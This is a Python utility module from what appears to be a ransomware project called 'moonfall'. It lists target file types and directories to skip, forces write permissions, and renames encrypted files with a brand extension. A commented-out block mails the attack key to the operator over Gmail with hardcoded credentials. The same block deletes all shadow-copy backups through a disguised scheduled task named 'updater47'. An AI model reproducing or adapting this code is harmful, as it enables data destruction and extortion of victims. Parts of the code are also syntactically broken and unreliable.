import os
import oschmod
import platform
import win32api

class Utils:
    BRAND_NAME = 'moonfall'
    BRAND_EXT = '.moonfall'
    
    SENDER = 'teamcyber541@gmail.com'
    SENDER_PASSWORD = 'new_password100'
    RECEIVER = 'teamcyber5412@gmail.com'
    
    MAIL_SERVER = 'smtp.gmail.com'
    MAIL_PORT = 587

    PROTECTED_DIRS = ['Content.IE5',
    'Temporary Internet Files',
    'AppData',
    'Program Files (x86)',
    'Program Files', 'ProgramData',
    'Intel',
    '$\\',
    'Local Settings',
    'Windows',
    'ransomware',
    'Boot',
    'System Volume Information']

    EXCLUDED_EXT = ['.moonfall',
    '.dll',
    '.exe']

    TARGET_EXT = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst','.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', 
  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot','.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', 
  '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ',
  '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif','.tiff', '.nef', '.psd', '.ai', 
  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb','.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
  '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
  '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']

    KEY_PASSWORD = 'key_FILE_passw0rd!'

    def get_file_extension(self, full_path):
        return os.path.splitext(full_path)[1]

    def save_data(self, full_path, data, opt='add_ext'):
        if not os.access(full_path, os.W_OK): # Doble comprobacion de los permisos.TODO ¿es estrcitamente necesario?
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.W_OK):
                raise PermissionError("Write permissions can't be modified")
            
        with open(full_path, 'wb') as file:
            file.write(data)

        if opt == 'add_ext':
            os.rename(full_path, full_path + self.BRAND_EXT)
        elif opt == 'del_ext':
            os.rename(full_path, full_path[:-len(self.BRAND_EXT)])
        else:
            raise ValueError('Invalid argument at the time of saving data')

    def load_data(self, full_path):
        if not os.access(full_path, os.R_OK):
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.R_OK):
                raise PermissionError("Read permisions can't be modified")
            
        with open(full_path, 'rb') as file:
            return file.read()

    def is_windows(self):
        return platform.system() == 'Windows'

    def get_local_drives(self):
        return win32api.GetLogicalDriveStrings().split('\000')[:-1]
"""
    def id_generator(self, size=12, chars=string.ascii_uppercase + string.digits)
        return ''.join(random.choice(chars) for _ in range(size))
    
    def send_mail_message(self, key):
        attack_id = self.id_generator()
        
        date = datetime.datetime.now()
        date = date.strftime("%c")
        
        msg = MIMEMultipart("alternative")
        msg["Subject"] = 'Key of attack with id ' + attack_id + ' at time ' + date
        msg["From"] = self.SENDER
        msg["To"] = self.RECEIVER

        msg.attach(MIMEText('Download the file', 'plain'))
        
        attach_file_name = attack_id + '_key.key'
        with open(attach_file_name, 'wb') as attach_file:
            attach_file.write(key)
        
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)  # encode the attachment

        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        msg.attach(payload)

        s = smtplib.SMTP(self.MAIL_SERVER, self.MAIL_PORT)
        s.ehlo()
        s.starttls()
        s.login(self.SENDER, self.SENDER_PASSWORD)
        s.sendmail(self.SENDER, self.RECEIVER, msg.as_string())
        s.quit()
        
	
	#Copypasted from https://github.com/sithis993/Crypter/blob/4b3148912dbe8f68c952b39f0c51c69513fe4af4/Crypter/Crypter/Crypter.py#L115
	def delete_shadow_files(self):
        '''
        @summary: Create, run and delete a scheduled task to delete all file shadow copies from disk
        '''

        vs_deleter = ScheduledTask(
            name="updater47",
            command="vssadmin Delete Shadows /All /Quiet"
        )
        vs_deleter.run_now()
        vs_deleter.cleanup()
"""
    

